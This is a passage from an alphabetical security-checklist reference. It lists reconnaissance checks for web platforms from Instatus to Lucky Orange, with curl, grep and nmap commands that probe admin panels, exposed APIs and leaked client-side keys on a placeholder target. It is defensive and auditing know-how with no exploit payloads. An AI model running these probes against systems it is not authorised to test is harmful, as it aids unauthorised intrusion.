Security checklists for Instatus status page platform.

### Check Instatus for exposed API tokens
<!-- id: instatus-1 | severity: medium | tags: instatus, status-page, api-key -->
Instatus API tokens in page JavaScript may allow unauthorized modifications to status page components and incidents.

**Commands:**
```bash
curl -s http://target.com | grep -i "instatus"
```

**References:**
- https://instatus.com/

---

## Intercom
<!-- id: intercom | icon: 🛠️ | color: #e06c75 -->
Security checklists for Intercom customer messaging platform.

### Check Intercom for exposed app ID
<!-- id: intercom-1 | severity: low | tags: intercom, messaging, app-id -->
Intercom app IDs in client-side JavaScript allow anyone to initiate conversations on behalf of the app.

**Commands:**
```bash
curl -s http://target.com | grep -i "intercom\|app_id"
```

**References:**
- https://www.intercom.com/security

### Check Intercom for exposed access tokens
<!-- id: intercom-2 | severity: high | tags: intercom, api-key, data-exposure -->
Intercom API access tokens exposed in client code allow unauthorized access to user conversations and data.

**References:**
- https://www.intercom.com/security

---

## Invision Community
<!-- id: invision-community | icon: 🛠️ | color: #e06c75 -->
Security checklists for Invision Community forum platform.

### Check Invision for exposed admin panel
<!-- id: invision-1 | severity: high | tags: invision, forum, admin, info-disclosure -->
Invision Community admin panel accessible without authentication provides full control over forums and user data.

**Commands:**
```bash
curl -s http://target.com/admin/
```

**References:**
- https://invisioncommunity.com/features/security/

### Check Invision for SQL injection
<!-- id: invision-2 | severity: critical | tags: invision, sqli, php -->
Invision Community has had historical SQL injection vulnerabilities in various modules.

**References:**
- https://invisioncommunity.com/features/security/

---

## IONOS
<!-- id: ionos | icon: 🛠️ | color: #e06c75 -->
Security checklists for IONOS (1&1) web hosting.

### Check IONOS for exposed control panel
<!-- id: ionos-1 | severity: high | tags: ionos, hosting, control-panel -->
IONOS control panel endpoints may be vulnerable to credential brute-forcing.

**References:**
- https://www.ionos.com/security

---

## IPB (Invision Power Board)
<!-- id: ipb | icon: 🛠️ | color: #e06c75 -->
Security checklists for Invision Power Board forum software.

### Check IPB for SQL injection vulnerabilities
<!-- id: ipb-1 | severity: critical | tags: ipb, forum, sqli, php -->
IPB has had historical SQL injection vulnerabilities in search, profile, and calendar modules.

**References:**
- https://invisioncommunity.com/features/security/

---

## IPFS (InterPlanetary File System)
<!-- id: ipfs | icon: 🛠️ | color: #e06c75 -->
Security checklists for IPFS gateway exposure.

### Check IPFS for public gateway API
<!-- id: ipfs-1 | severity: high | tags: ipfs, gateway, api, ipfs -->
Public IPFS gateways and API endpoints may expose all hosted content and allow file uploads.

**Commands:**
```bash
curl -s http://target.com:5001/api/v0/id
curl -s http://target.com:8080/ipfs/QmQJHzKxPJ7oQoAizHMoKuf9av3GmGhxxRMf1P7q6Pckfw
```

**References:**
- https://docs.ipfs.tech/reference/http/api/

### Check IPFS for exposed pinned content
<!-- id: ipfs-2 | severity: medium | tags: ipfs, content, info-disclosure -->
IPFS API may expose all pinned content and peer information without authentication.

**Commands:**
```bash
curl -s http://target.com:5001/api/v0/pin/ls
curl -s http://target.com:5001/api/v0/swarm/peers
```

**References:**
- https://docs.ipfs.tech/reference/http/api/

---

## IPinfo
<!-- id: ipinfo | icon: 🛠️ | color: #e06c75 -->
Security checklists for IPinfo IP geolocation API.

### Check IPinfo for exposed API token
<!-- id: ipinfo-1 | severity: medium | tags: ipinfo, api-key, geolocation -->
IPinfo API tokens in client-side JavaScript allow unauthorized IP data lookups.

**Commands:**
```bash
curl -s http://target.com | grep -i "ipinfo"
```

**References:**
- https://ipinfo.io/developers

---

## Isotope
<!-- id: isotope | icon: 🛠️ | color: #e06c75 -->
Security checklists for Isotope JavaScript grid/layout library.

### Check Isotope for outdated version
<!-- id: isotope-1 | severity: low | tags: isotope, javascript-library, outdated -->
Older Isotope versions may have DOM manipulation or prototype pollution vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "isotope"
```

**References:**
- https://isotope.metafizzy.co/

---

## Iterable
<!-- id: iterable | icon: 🛠️ | color: #e06c75 -->
Security checklists for Iterable marketing platform.

### Check Iterable for exposed API keys
<!-- id: iterable-1 | severity: high | tags: iterable, api-key, marketing, data-exposure -->
Iterable API keys in client-side JavaScript expose user data, campaigns, and automation workflows.

**Commands:**
```bash
curl -s http://target.com | grep -i "iterable"
```

**References:**
- https://iterable.com/security/

---

## J2Store
<!-- id: j2store | icon: 🛠️ | color: #e06c75 -->
Security checklists for J2Store Joomla e-commerce extension.

### Check J2Store for SQL injection
<!-- id: j2store-1 | severity: critical | tags: j2store, ecommerce, sqli, joomla -->
J2Store processes user-supplied data in multiple parameters and may be vulnerable to SQL injection.

**References:**
- https://www.j2store.org/

---

## Jadu (Central CMS)
<!-- id: jadu | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jadu central government CMS and portal.

### Check Jadu for exposed admin endpoints
<!-- id: jadu-1 | severity: high | tags: jadu, cms, admin, government -->
Jadu CMS portals may expose admin login pages and configuration endpoints.

**Commands:**
```bash
curl -s http://target.com/jadu/
curl -s http://target.com/jadu/admin/
```

**References:**
- https://www.jadu.net/

---

## Jahia DX
<!-- id: jahia | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jahia Digital Experience Platform.

### Check Jahia for default credentials
<!-- id: jahia-1 | severity: critical | tags: jahia, dxp, default-creds, admin -->
Jahia DX with default credentials grants full content management access.

**Commands:**
```bash
curl -s http://target.com:8080/administration
```

**References:**
- https://www.jahia.com/

### Check Jahia for exposed admin console
<!-- id: jahia-2 | severity: high | tags: jahia, admin, console -->
Jahia administrative console may be accessible without proper authentication.

**Commands:**
```bash
curl -s http://target.com:8080/administration
```

**References:**
- https://www.jahia.com/

---

## Jalios
<!-- id: jalios | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jalios digital experience platform.

### Check Jalios for exposed workspace/jcore endpoints
<!-- id: jalios-1 | severity: high | tags: jalios, dxp, workspace, info-disclosure -->
Jalios workspaces and JCMS REST API may expose documents and user data.

**References:**
- https://www.jalios.com/

---

## JW Player
<!-- id: jwplayer | icon: 🛠️ | color: #e06c75 -->
Security checklists for JW Player video platform.

### Check JW Player for exposed license/API keys
<!-- id: jwplayer-1 | severity: medium | tags: jwplayer, video, api-key -->
JW Player license keys and API tokens in client-side JavaScript allow unauthorized video management access.

**Commands:**
```bash
curl -s http://target.com | grep -i "jwplayer\|jw-"
```

**References:**
- https://www.jwplayer.com/security/

---

## Jekyll
<!-- id: jekyll | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jekyll static site generator.

### Check Jekyll for exposed configuration files
<!-- id: jekyll-1 | severity: high | tags: jekyll, static-site, config, info-disclosure -->
Jekyll `_config.yml` files exposed on production reveal deployment settings, API keys, and plugin configurations.

**Commands:**
```bash
curl -s http://target.com/_config.yml
curl -s http://target.com/_site/
```

**References:**
- https://jekyllrb.com/docs/configuration/

---

## Jetpack
<!-- id: jetpack | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jetpack WordPress plugin.

### Check Jetpack for exposed site stats and connection data
<!-- id: jetpack-1 | severity: medium | tags: jetpack, wordpress, plugin, info-disclosure -->
Jetpack XML-RPC endpoints may expose site connection data, stats, and WordPress.com credentials.

**Commands:**
```bash
curl -s http://target.com/xmlrpc.php?for=jetpack
```

**References:**
- https://jetpack.com/support/security/

---

## Jetty
<!-- id: jetty | icon: 🛠️ | color: #e06c75 -->
Security checklists for Eclipse Jetty web server.

### Check Jetty for exposed admin contexts
<!-- id: jetty-1 | severity: high | tags: jetty, webserver, admin, info-disclosure -->
Jetty default contexts like `/test`, `/examples`, and JMX console may be exposed without authentication.

**Commands:**
```bash
curl -s http://target.com/test/
curl -s http://target.com/jmx-console/
```

**References:**
- https://eclipse.dev/jetty/documentation/

---

## Jitsi
<!-- id: jitsi | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jitsi Meet video conferencing.

### Check Jitsi for unauthenticated room access
<!-- id: jitsi-1 | severity: high | tags: jitsi, video, conferencing, auth-bypass -->
Jitsi Meet rooms without authentication allow unauthorized meeting access and eavesdropping.

**Commands:**
```bash
curl -s http://target.com/room-name
curl -s http://target.com/api/v1/health
```

**References:**
- https://jitsi.org/security/

---

## Jotform
<!-- id: jotform | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jotform online form builder.

### Check Jotform for exposed form submissions
<!-- id: jotform-1 | severity: high | tags: jotform, forms, data-exposure -->
Jotform forms may expose submission data and uploaded files if submissions are publicly accessible.

**Commands:**
```bash
curl -s http://target.com/form/ID/submissions
```

**References:**
- https://www.jotform.com/security/

---

## Jumio
<!-- id: jumio | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jumio identity verification platform.

### Check Jumio for exposed API tokens
<!-- id: jumio-1 | severity: critical | tags: jumio, identity, api-key, kyc -->
Jumio API tokens embedded in client-side code allow unauthorized identity verification access.

**Commands:**
```bash
curl -s http://target.com | grep -i "jumio\|netverify"
```

**References:**
- https://www.jumio.com/security/

---

## JumpCloud
<!-- id: jumpcloud | icon: 🛠️ | color: #e06c75 -->
Security checklists for JumpCloud directory platform.

### Check JumpCloud for exposed LDAP endpoints
<!-- id: jumpcloud-1 | severity: high | tags: jumpcloud, ldap, directory, info-disclosure -->
JumpCloud LDAP and RADIUS endpoints exposed allow brute-force attempts on directory services.

**Commands:**
```bash
nmap -p 389,636,1812 target.com
```

**References:**
- https://jumpcloud.com/security

---

## Juspay
<!-- id: juspay | icon: 🛠️ | color: #e06c75 -->
Security checklists for Juspay payment platform.

### Check Juspay for exposed API endpoints
<!-- id: juspay-1 | severity: critical | tags: juspay, payments, api, data-exposure -->
Juspay payment API endpoints may leak transaction data and payment tokens.

**Commands:**
```bash
curl -s http://target.com/juspay/
```

**References:**
- https://juspay.in/security

---

## Kaltura
<!-- id: kaltura | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kaltura video platform.

### Check Kaltura for exposed API secrets
<!-- id: kaltura-1 | severity: high | tags: kaltura, video, cms, api-key -->
Kaltura API secrets in client-side JavaScript allow unauthorized video content management.

**Commands:**
```bash
curl -s http://target.com | grep -i "kaltura"
```

**References:**
- https://corp.kaltura.com/security/

---

## Kameleoon
<!-- id: kameleoon | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kameleoon A/B testing platform.

### Check Kameleoon for exposed site ID
<!-- id: kameleoon-1 | severity: low | tags: kameleoon, analytics, site-id -->
Kameleoon site ID exposed in JavaScript allows third parties to identify the site and its experiments.

**Commands:**
```bash
curl -s http://target.com | grep -i "kameleoon"
```

**References:**
- https://www.kameleoon.com/en/platform/security

---

## Kasada
<!-- id: kasada | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kasada bot detection platform.

### Check Kasada for identification in page source
<!-- id: kasada-1 | severity: low | tags: kasada, bot-detection, waf -->
Kasada bot protection scripts identify the use of advanced anti-bot measures on the target.

**Commands:**
```bash
curl -s http://target.com | grep -i "kasada"
```

**References:**
- https://www.kasada.io/

---

## Kendo UI
<!-- id: kendo-ui | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kendo UI framework.

### Check Kendo UI for exposed data source endpoints
<!-- id: kendo-ui-1 | severity: medium | tags: kendoui, javascript, framework, api -->
Kendo UI data source configurations in client-side code may expose backend API endpoints.

**Commands:**
```bash
curl -s http://target.com | grep -i "kendo\|data-source"
```

**References:**
- https://www.telerik.com/kendo-ui

---

## Kentico CMS
<!-- id: kentico-cms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kentico CMS.

### Check Kentico CMS for exposed admin endpoints
<!-- id: kentico-cms-1 | severity: high | tags: kentico, cms, admin -->
Kentico CMS admin interface (`/cms`, `/admin`) exposed allows unauthorized content management access.

**Commands:**
```bash
curl -s http://target.com/cms/
curl -s http://target.com/admin/
```

**References:**
- https://www.kentico.com/security

---

## Kestrel
<!-- id: kestrel | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kestrel web server.

### Check Kestrel for version disclosure
<!-- id: kestrel-1 | severity: low | tags: kestrel, webserver, dotnet, info-disclosure -->
Kestrel server header reveals ASP.NET Core version and aids targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "kestrel\|server"
```

**References:**
- https://learn.microsoft.com/en-us/aspnet/core/fundamentals/servers/kestrel

---

## KeyCDN
<!-- id: keycdn | icon: 🛠️ | color: #e06c75 -->
Security checklists for KeyCDN content delivery network.

### Check KeyCDN for origin IP exposure
<!-- id: keycdn-1 | severity: high | tags: keycdn, cdn, origin-exposure -->
KeyCDN misconfigurations may expose the origin server IP, bypassing CDN security.

**Commands:**
```bash
curl -sI http://target.com | grep -i "keycdn"
```

**References:**
- https://www.keycdn.com/support/security

---

## Keybase
<!-- id: keybase | icon: 🛠️ | color: #e06c75 -->
Security checklists for Keybase identity platform.

### Check Keybase for exposed proof and key data
<!-- id: keybase-1 | severity: low | tags: keybase, identity, encryption -->
Keybase proofs and public keys exposed via DNS or user profiles aid social engineering and OSINT gathering.

**Commands:**
```bash
curl -s https://keybase.io/_/api/1.0/user/lookup.json?username=target
```

**References:**
- https://keybase.io/docs/api

---

## Kinsta
<!-- id: kinsta | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kinsta managed WordPress hosting.

### Check Kinsta for exposed admin URLs
<!-- id: kinsta-1 | severity: medium | tags: kinsta, hosting, wordpress, admin -->
Kinsta hosted sites use default admin paths that may be probed for configuration exposure.

**Commands:**
```bash
curl -s http://target.com/wp-admin/
```

**References:**
- https://kinsta.com/security/

---

## Kintone
<!-- id: kintone | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kintone low-code platform.

### Check Kintone for exposed guest spaces
<!-- id: kintone-1 | severity: high | tags: kintone, low-code, guest-access -->
Kintone guest spaces without proper access control allow unauthorized data access.

**Commands:**
```bash
curl -s http://target.com/k/guest/
```

**References:**
- https://www.kintone.com/security/

---

## Kirby
<!-- id: kirby | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kirby CMS.

### Check Kirby for exposed panel endpoints
<!-- id: kirby-1 | severity: high | tags: kirby, cms, panel, admin -->
Kirby CMS panel (`/panel`) exposed to the internet allows brute-force attacks on admin credentials.

**Commands:**
```bash
curl -s http://target.com/panel/
```

**References:**
- https://getkirby.com/security

---

## Klarna
<!-- id: klarna | icon: 🛠️ | color: #e06c75 -->
Security checklists for Klarna payment platform.

### Check Klarna for exposed API credentials
<!-- id: klarna-1 | severity: critical | tags: klarna, payments, api-key, checkout -->
Klarna API credentials in client-side code allow unauthorized payment operations and order manipulation.

**Commands:**
```bash
curl -s http://target.com | grep -i "klarna"
```

**References:**
- https://docs.klarna.com/security/

---

## Klaviyo
<!-- id: klaviyo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Klaviyo marketing automation.

### Check Klaviyo for exposed API keys
<!-- id: klaviyo-1 | severity: high | tags: klaviyo, marketing, api-key, email -->
Klaviyo API keys in client-side JavaScript expose email marketing data and subscriber lists.

**Commands:**
```bash
curl -s http://target.com | grep -i "klaviyo"
```

**References:**
- https://www.klaviyo.com/security

---

## Knockout.js
<!-- id: knockout-js | icon: 🛠️ | color: #e06c75 -->
Security checklists for Knockout.js framework.

### Check Knockout.js for client-side data binding exposure
<!-- id: knockout-js-1 | severity: medium | tags: knockoutjs, javascript, framework, data-exposure -->
Knockout.js data-bind attributes in HTML may expose internal data structures, API endpoints, or sensitive fields.

**Commands:**
```bash
curl -s http://target.com | grep -i "data-bind\|ko\." | head -50
```

**References:**
- https://knockoutjs.com/documentation/introduction.html

---

## Ko-fi
<!-- id: ko-fi | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ko-fi donation platform.

### Check Ko-fi for exposed widget API key
<!-- id: ko-fi-1 | severity: low | tags: ko-fi, donations, api-key -->
Ko-fi widget API keys in page source may expose donation data and supporter information.

**Commands:**
```bash
curl -s http://target.com | grep -i "ko-fi\|kofi"
```

**References:**
- https://ko-fi.com/security

---

## Koa
<!-- id: koa | icon: 🛠️ | color: #e06c75 -->
Security checklists for Koa.js Node.js framework.

### Check Koa for exposed stack traces
<!-- id: koa-1 | severity: medium | tags: koa, nodejs, framework, info-disclosure -->
Koa.js applications with error handling misconfigurations expose stack traces and internal paths.

**Commands:**
```bash
curl -s http://target.com/nonexistent-route
curl -sI http://target.com | grep -i "koa\|x-powered-by"
```

**References:**
- https://koajs.com/

---

## Kong
<!-- id: kong | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kong API Gateway.

### Check Kong Admin API for unauthorized access
<!-- id: kong-1 | severity: critical | tags: kong, api-gateway, admin, unauth-access -->
Kong Admin API exposed on public ports allows full API gateway configuration modification.

**Commands:**
```bash
curl -s http://target.com:8001/
curl -s http://target.com:8001/services
```

**References:**
- https://docs.konghq.com/enterprise/security/

---

## Kotlin
<!-- id: kotlin | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kotlin programming language.

### Check Kotlin for exposed API endpoints in compiled code
<!-- id: kotlin-1 | severity: low | tags: kotlin, language, reverse-engineering -->
Kotlin compiled applications may expose cleartext API endpoints and configuration strings that can be decompiled.

**Commands:**
```bash
strings target.apk | grep -i "https\?://"
```

**References:**
- https://kotlinlang.org/docs/security.html

---

## Ktor
<!-- id: ktor | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ktor framework.

### Check Ktor for server header disclosure
<!-- id: ktor-1 | severity: low | tags: ktor, kotlin, framework, info-disclosure -->
Ktor server headers reveal framework version and Kotlin runtime information.

**Commands:**
```bash
curl -sI http://target.com | grep -i "ktor\|server"
```

**References:**
- https://ktor.io/docs/security.html

---

## Landingi
<!-- id: landingi | icon: 🛠️ | color: #e06c75 -->
Security checklists for Landingi landing page builder.

### Check Landingi for exposed page data
<!-- id: landingi-1 | severity: medium | tags: landingi, landing-pages, info-disclosure -->
Landingi published pages may expose unpublished variations and page configuration data.

**Commands:**
```bash
curl -s http://target.com | grep -i "landingi"
```

**References:**
- https://landingi.com/security/

---

## LaunchDarkly
<!-- id: launchdarkly | icon: 🛠️ | color: #e06c75 -->
Security checklists for LaunchDarkly feature management platform.

### Check LaunchDarkly for exposed client-side ID
<!-- id: launchdarkly-1 | severity: medium | tags: launchdarkly, feature-flags, sdk, client-id -->
LaunchDarkly client-side ID exposed in JavaScript allows third parties to read feature flag states and user targeting.

**Commands:**
```bash
curl -s http://target.com | grep -i "launchdarkly\|ldclient"
```

**References:**
- https://docs.launchdarkly.com/security

---

## LazySizes
<!-- id: lazysizes | icon: 🛠️ | color: #e06c75 -->
Security checklists for LazySizes lazy loading library.

### Check LazySizes for data attribute exposure
<!-- id: lazysizes-1 | severity: low | tags: lazysizes, javascript, lazy-load -->
LazySizes `data-src` attributes in HTML may reveal backend image paths and internal URL structures.

**Commands:**
```bash
curl -s http://target.com | grep -i "lazysizes\|data-src" | head -20
```

**References:**
- https://github.com/aFarkas/lazysizes

---

## LeadPages
<!-- id: leadpages | icon: 🛠️ | color: #e06c75 -->
Security checklists for LeadPages landing page builder.

### Check LeadPages for exposed page IDs
<!-- id: leadpages-1 | severity: low | tags: leadpages, landing-pages, analytics -->
LeadPages page IDs in scripts allow mapping of A/B test variations and page performance data.

**Commands:**
```bash
curl -s http://target.com | grep -i "leadpages"
```

**References:**
- https://www.leadpages.com/security

---

## Leaflet
<!-- id: leaflet | icon: 🛠️ | color: #e06c75 -->
Security checklists for Leaflet mapping library.

### Check Leaflet for exposed API keys in tile URLs
<!-- id: leaflet-1 | severity: high | tags: leaflet, maps, javascript, api-key -->
Leaflet tile layer URLs may contain API keys for map tile services, enabling unauthorized usage.

**Commands:**
```bash
curl -s http://target.com | grep -i "leaflet\|tile\|mapbox" | grep -i "key\|token\|api"
```

**References:**
- https://leafletjs.com/

---

## LearnDash
<!-- id: learndash | icon: 🛠️ | color: #e06c75 -->
Security checklists for LearnDash LMS plugin.

### Check LearnDash for exposed course data
<!-- id: learndash-1 | severity: medium | tags: learndash, lms, wordpress, data-exposure -->
LearnDash course content and quiz answers may be accessible without proper enrollment verification.

**Commands:**
```bash
curl -s http://target.com/courses/course-name/
curl -s http://target.com/wp-json/ldlms/v1/
```

**References:**
- https://www.learndash.com/security/

---

## LearnWorlds
<!-- id: learnworlds | icon: 🛠️ | color: #e06c75 -->
Security checklists for LearnWorlds LMS platform.

### Check LearnWorlds for exposed API endpoints
<!-- id: learnworlds-1 | severity: medium | tags: learnworlds, lms, api, info-disclosure -->
LearnWorlds REST API endpoints may leak course structure, user progress, and enrollment data.

**Commands:**
```bash
curl -s http://target.com/api/v1/courses
```

**References:**
- https://www.learnworlds.com/security/

---

## Lemon Squeezy
<!-- id: lemon-squeezy | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lemon Squeezy payment platform.

### Check Lemon Squeezy for exposed API keys
<!-- id: lemon-squeezy-1 | severity: critical | tags: lemonsqueezy, payments, api-key, ecommerce -->
Lemon Squeezy API keys in client-side code allow unauthorized payment and store management access.

**Commands:**
```bash
curl -s http://target.com | grep -i "lemonsqueezy\|lemon-squeezy"
```

**References:**
- https://www.lemonsqueezy.com/security

---

## Less
<!-- id: less | icon: 🛠️ | color: #e06c75 -->
Security checklists for Less CSS pre-processor.

### Check Less for exposed source maps
<!-- id: less-1 | severity: low | tags: less, css, preprocessor, source-maps -->
Less source maps in production expose original `.less` file structure and may reveal comments with sensitive info.

**Commands:**
```bash
curl -s http://target.com/css/style.css.map | head -20
curl -s http://target.com | grep -i ".less"
```

**References:**
- https://lesscss.org/

---

## Let's Encrypt
<!-- id: lets-encrypt | icon: 🛠️ | color: #e06c75 -->
Security checklists for Let's Encrypt TLS certificates.

### Check Let's Encrypt for certificate transparency logs
<!-- id: lets-encrypt-1 | severity: low | tags: letsencrypt, tls, certificates, subdomains -->
Let's Encrypt certificate transparency logs can be queried to discover all subdomains issued certificates for a domain.

**Commands:**
```bash
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**References:**
- https://letsencrypt.org/docs/

---

## Lever
<!-- id: lever | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lever ATS platform.

### Check Lever for exposed job board data
<!-- id: lever-1 | severity: low | tags: lever, ats, jobs, info-disclosure -->
Lever-hosted job boards may expose internal job postings and candidate application data.

**Commands:**
```bash
curl -s http://target.com/jobs
curl -s https://jobs.lever.co/target-company/
```

**References:**
- https://www.lever.co/security/

---

## Liquid Web
<!-- id: liquid-web | icon: 🛠️ | color: #e06c75 -->
Security checklists for Liquid Web hosting.

### Check Liquid Web for server information disclosure
<!-- id: liquid-web-1 | severity: low | tags: liquidweb, hosting, info-disclosure -->
Liquid Web server headers may reveal hosting provider and server configuration details.

**Commands:**
```bash
curl -sI http://target.com | grep -i "server\|x-powered"
```

**References:**
- https://www.liquidweb.com/security/

---

## List.js
<!-- id: list-js | icon: 🛠️ | color: #e06c75 -->
Security checklists for List.js library.

### Check List.js for exposed data attributes
<!-- id: list-js-1 | severity: low | tags: listjs, javascript, frontend, info-disclosure -->
List.js data attributes in HTML may expose internal data structures and hidden content.

**Commands:**
```bash
curl -s http://target.com | grep -i "list.js\|data-list" | head -20
```

**References:**
- https://listjs.com/

---

## Listrak
<!-- id: listrak | icon: 🛠️ | color: #e06c75 -->
Security checklists for Listrak marketing platform.

### Check Listrak for exposed API credentials
<!-- id: listrak-1 | severity: medium | tags: listrak, marketing, api-key, email -->
Listrak API credentials in client-side JavaScript allow unauthorized email marketing data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "listrak"
```

**References:**
- https://www.listrak.com/security/

---

## LiteSpeed
<!-- id: litespeed | icon: 🛠️ | color: #e06c75 -->
Security checklists for LiteSpeed web server.

### Check LiteSpeed for server header disclosure
<!-- id: litespeed-1 | severity: low | tags: litespeed, webserver, info-disclosure -->
LiteSpeed server header reveals server software and version for targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "litespeed\|server"
```

**References:**
- https://www.litespeedtech.com/security

---

## Litmus
<!-- id: litmus | icon: 🛠️ | color: #e06c75 -->
Security checklists for Litmus email testing platform.

### Check Litmus for exposed tracking pixels
<!-- id: litmus-1 | severity: low | tags: litmus, email, tracking, analytics -->
Litmus email tracking pixels may reveal when and where emails are opened.

**Commands:**
```bash
curl -s http://target.com | grep -i "litmus"
```

**References:**
- https://www.litmus.com/security/

---

## LiveAgent
<!-- id: liveagent | icon: 🛠️ | color: #e06c75 -->
Security checklists for LiveAgent help desk platform.

### Check LiveAgent for exposed chat data
<!-- id: liveagent-1 | severity: medium | tags: liveagent, helpdesk, chat, api -->
LiveAgent chat widgets may expose API endpoints and department IDs for unauthorized ticket access.

**Commands:**
```bash
curl -s http://target.com | grep -i "liveagent\|la"
```

**References:**
- https://www.liveagent.com/security/

---

## LiveChat
<!-- id: livechat | icon: 🛠️ | color: #e06c75 -->
Security checklists for LiveChat customer service platform.

### Check LiveChat for exposed license numbers
<!-- id: livechat-1 | severity: medium | tags: livechat, chat, license, info-disclosure -->
LiveChat license numbers in JavaScript allow tracking of agent activity and chat data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "livechat\|lc"
```

**References:**
- https://www.livechat.com/security/

---

## LivePerson
<!-- id: liveperson | icon: 🛠️ | color: #e06c75 -->
Security checklists for LivePerson messaging platform.

### Check LivePerson for exposed account ID
<!-- id: liveperson-1 | severity: medium | tags: liveperson, chat, account-id, messaging -->
LivePerson account ID in JavaScript allows third parties to identify engagement data and skill routing.

**Commands:**
```bash
curl -s http://target.com | grep -i "liveperson\|lpTag"
```

**References:**
- https://www.liveperson.com/security/

---

## Livewire
<!-- id: livewire | icon: 🛠️ | color: #e06c75 -->
Security checklists for Livewire Laravel framework.

### Check Livewire for exposed component data
<!-- id: livewire-1 | severity: medium | tags: livewire, laravel, framework, info-disclosure -->
Livewire component payloads may leak server-side data including model attributes and internal state.

**Commands:**
```bash
curl -s http://target.com/livewire/message/ -X POST
curl -s http://target.com | grep -i "livewire\|wire:"
```

**References:**
- https://livewire.laravel.com/docs/security

---

## Lodash
<!-- id: lodash | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lodash JavaScript library.

### Check Lodash for prototype pollution risk
<!-- id: lodash-1 | severity: high | tags: lodash, javascript, library, prototype-pollution -->
Lodash versions vulnerable to prototype pollution may allow attackers to manipulate object properties and bypass security checks.

**Commands:**
```bash
curl -s http://target.com | grep -i "lodash\|_.js"
```

**References:**
- https://lodash.com/docs/#security

---

## Lodgify
<!-- id: lodgify | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lodgify vacation rental platform.

### Check Lodgify for exposed booking data
<!-- id: lodgify-1 | severity: medium | tags: lodgify, rentals, bookings, data-exposure -->
Lodgify booking widgets may expose reservation details, guest names, and pricing data.

**Commands:**
```bash
curl -s http://target.com | grep -i "lodgify"
```

**References:**
- https://www.lodgify.com/security/

---

## LogRocket
<!-- id: logrocket | icon: 🛠️ | color: #e06c75 -->
Security checklists for LogRocket session replay platform.

### Check LogRocket for exposed app key
<!-- id: logrocket-1 | severity: high | tags: logrocket, session-replay, app-key, data-exposure -->
LogRocket app key in client-side code allows third parties to record user sessions and capture sensitive data input.

**Commands:**
```bash
curl -s http://target.com | grep -i "logrocket"
```

**References:**
- https://docs.logrocket.com/reference/security

---

## Login with Amazon
<!-- id: login-with-amazon | icon: 🛠️ | color: #e06c75 -->
Security checklists for Login with Amazon OAuth.

### Check Login with Amazon for exposed client ID
<!-- id: login-with-amazon-1 | severity: medium | tags: amazon, oauth, login, client-id -->
Login with Amazon client ID exposed in JavaScript enables CSRF and phishing attack setups.

**Commands:**
```bash
curl -s http://target.com | grep -i "amazon\|amazon-login"
```

**References:**
- https://developer.amazon.com/docs/login-with-amazon/security.html

---

## LoginRadius
<!-- id: loginradius | icon: 🛠️ | color: #e06c75 -->
Security checklists for LoginRadius identity platform.

### Check LoginRadius for exposed API key
<!-- id: loginradius-1 | severity: medium | tags: loginradius, auth, api-key, identity -->
LoginRadius API key in client-side code allows unauthorized profile data access and social login manipulation.

**Commands:**
```bash
curl -s http://target.com | grep -i "loginradius\|lr"
```

**References:**
- https://www.loginradius.com/security/

---

## Looker
<!-- id: looker | icon: 🛠️ | color: #e06c75 -->
Security checklists for Looker data platform.

### Check Looker for exposed embed URLs
<!-- id: looker-1 | severity: medium | tags: looker, analytics, embed, data-exposure -->
Looker embedded dashboard URLs may expose internal data views and business intelligence reports.

**Commands:**
```bash
curl -s http://target.com | grep -i "looker\|cloud\.looker"
```

**References:**
- https://cloud.google.com/looker/docs/security

---

## Loom
<!-- id: loom | icon: 🛠️ | color: #e06c75 -->
Security checklists for Loom video messaging platform.

### Check Loom for exposed video URLs
<!-- id: loom-1 | severity: medium | tags: loom, video, sharing, data-exposure -->
Loom video embed URLs may expose unlisted videos that rely on URL obscurity for access control.

**Commands:**
```bash
curl -s http://target.com | grep -i "loom\|loom\.com/embed"
```

**References:**
- https://www.loom.com/security

---

## Loox
<!-- id: loox | icon: 🛠️ | color: #e06c75 -->
Security checklists for Loox review platform.

### Check Loox for exposed store ID
<!-- id: loox-1 | severity: low | tags: loox, reviews, ecommerce, store-id -->
Loox store ID in JavaScript allows identification of review volume and customer data exposure.

**Commands:**
```bash
curl -s http://target.com | grep -i "loox"
```

**References:**
- https://loox.io/security

---

## LottieFiles
<!-- id: lottiefiles | icon: 🛠️ | color: #e06c75 -->
Security checklists for LottieFiles animation platform.

### Check LottieFiles for exposed animation data
<!-- id: lottiefiles-1 | severity: low | tags: lottiefiles, animations, javascript, lottie -->
LottieFiles JSON animation URLs may leak internal design assets and project identifiers.

**Commands:**
```bash
curl -s http://target.com | grep -i "lottie\|lottiefiles"
```

**References:**
- https://lottiefiles.com/security

---

## Lucky Orange
<!-- id: lucky-orange | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lucky Orange analytics platform.

### Check Lucky Orange for exposed site ID
<!-- id: lucky-orange-1 | severity: medium | tags: luckyorange, analytics, session-replay, site-id -->
